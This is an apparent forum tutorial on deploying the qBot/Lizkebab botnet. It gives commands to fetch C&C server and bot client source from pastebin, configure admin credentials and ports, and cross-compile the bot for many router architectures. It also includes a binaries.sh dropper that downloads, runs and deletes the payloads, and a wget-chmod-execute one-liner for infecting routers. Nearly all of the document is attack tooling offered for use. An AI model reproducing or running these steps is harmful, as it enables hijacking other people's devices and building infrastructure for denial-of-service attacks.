# irc-botnet
In this tutorial I will be showing you how to setup your LizardSquad botnet!
This botnet is actually called qBot / Lizkebab. You can find the source code HERE but it is heavily crippled.
Thankfully, I will be providing the uncrippled source code.

This is NOT IRC or HTTP

THIS IS P2P

Requirements: 
[+] A VPS or dedi to host your C&C.
[+] A second VPS / dedi capable of scanning for bots.
[+] The ability to think outside the box.
[+] Common sence.

—Lets begin—

To start, we will need to get all the proper dependencys.
For CentOS
Code:
yum install gcc nano -y
For Debian/Ubuntu
Code:
apt-get install gcc nano -y
Once that is completed, you are going to wget the server.c
Code:
wget http://pastebin.com/raw.php?i=Be4G0g85 -O server.c
You are now going to edit your server.c to your desired login infomation and login port.
Code:
//Admin-Config
#define MY_MGM_ADMINP "Pass"
#define MY_MGM_ADMINU "User"
#define MY_MGM_PORT 6969
Would look like

Code:
//Admin-Config
#define MY_MGM_ADMINP "0p#%Ø6x#Ḁ+зplНЗ3RṲ"
#define MY_MGM_ADMINU "XMPP"
#define MY_MGM_PORT 911
Now to compile the server.c it is as simple as
Code:
gcc server.c -o server -pthread
———————————————

Now for the client.c

On your server that will be hosting the client files, enter this:
Code:
wget http://pastebin.com/raw.php?i=qkDnzQHX -O client.c
Now here comes the most important part.
We will be configuring the client to connect to the P2P server.

Edit your client.c
Code:
nano client.c
Once you are in, we will find the space for our IP and Port by
pressing CTRL+W and then searching for
Code:
IP:PORT
Replace IP:PORT with your C&C server’s IP and the port you would 
like the bots to be infected on. (DONT USE YOUR MGM PORT)
It would look like this.
Code:
127.0.0.1:6969
The bots would connect on the port 6969 and the C&C will figure that out.

While you are still editing your client.c press CTRL+W again and search for 
Code:
wget
It will bring you to a this line.
Code:
cd /tmp && wget http://IP/binaries.sh && chmod +x binaries.sh && sh binaries.sh && rm -f binaries.sh
Now replace the IP with your httpd server IP
Code:
cd /tmp && wget http://127.0.0.1/binaries.sh && chmod +x binaries.sh && sh binaries.sh && rm -f binaries.sh\r\n
Now repeat this by pressing CTRL+W and searching for wget again and so forth.

———————————————

Finally, we will compile our client.c for multiple router archatectures.

Here is a sh script coded to automatically compile for all archatectures.

CentOS
Code:
#!/bin/bash

### CONFIG ###
mips="prefixmips"
arm5="prefixarm5"
mipsel="prefixmipsel"
sh4="prefixsh4"
ppc="prefixppc"
i686="prefixi686"
m68="prefixm68"
arm4="prefixarm4"
##############

wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2

tar -xf cross-compiler-armv5l.tar.bz2
tar -xf cross-compiler-mips.tar.bz2
tar -xf cross-compiler-mipsel.tar.bz2
tar -xf cross-compiler-powerpc.tar.bz2
tar -xf cross-compiler-sh4.tar.bz2
tar -xf cross-compiler-i686.tar.bz2
tar -xf cross-compiler-m68k.tar.bz2
tar -xf cross-compiler-armv4l.tar.bz2

./cross-compiler-armv5l/bin/armv5l-gcc -o /var/www/html/${arm5} /var/www/html/client.c -pthread
./cross-compiler-armv4l/bin/armv4l-gcc -o /var/www/html/${arm4} /var/www/html/client.c -pthread
./cross-compiler-mips/bin/mips-gcc -o /var/www/html/${mips} /var/www/html/client.c -pthread
./cross-compiler-sh4/bin/sh4-gcc -o /var/www/html/${sh4} /var/www/html/client.c -pthread
./cross-compiler-powerpc/bin/powerpc-gcc -o /var/www/html/${ppc} /var/www/html/client.c -pthread
./cross-compiler-m68k/bin/m68k-gcc -o /var/www/html/${m68k} /var/www/html/client.c -pthread
./cross-compiler-mipsel/bin/mipsel-gcc -o /var/www/html/${mipsel} /var/www/html/client.c -pthread
./cross-compiler-i686/bin/i686-gcc -o /var/www/html/${i686} /var/www/html/client.c -pthread
Once that has finished.

Here is a binaries.sh I have made for the downloading and execution of the compiled files
Code:
#!/bin/bash

#####CONFIG#####
mips="prefixmips"
arm5="prefixarm5"
mipsel="prefixmipsel"
sh4="prefixsh4"
ppc="prefixppc"
i686="prefixi686"
m68="prefixm68"
arm4="prefixarm4"
################

######WGET######
cd /tmp
wget --quiet http://IP/${mips}
wget --quiet http://IP/${mipsel}
wget --quiet http://IP/${arm4}
wget --quiet http://IP/${arm5}
wget --quiet http://IP/${sh4}
wget --quiet http://IP/${ppc}
wget --quiet http://IP/${i686}
################

#####CH MOD#####
chmod +x ${mips}
chmod +x ${mipsel}
chmod +x ${arm4}
chmod +x ${arm5}
chmod +x ${sh4}
chmod +x ${ppc}
chmod +x ${i686}
################

######EXEC######
./${mips}
./${mipsel}
./${arm4}
./${arm5}
./${sh4}
./${ppc}
./${i686}
################

#####REMOVE#####
rm -rf *
################
Be sure the IP in ‘http://IP/’ is the same as the one used in your client.c

Now all you need to do is put the binaries.sh into your /var/www/html and wget it
onto some routers. An example of how to would be like this.
Code:
wget http://127.0.0.1/binaries.sh ; chmod +x binaries.sh ; sh binaries.sh ; rm -f binaries.sh
Thanks everyone for reading, and be sure to like the thread if you enjoyed! 
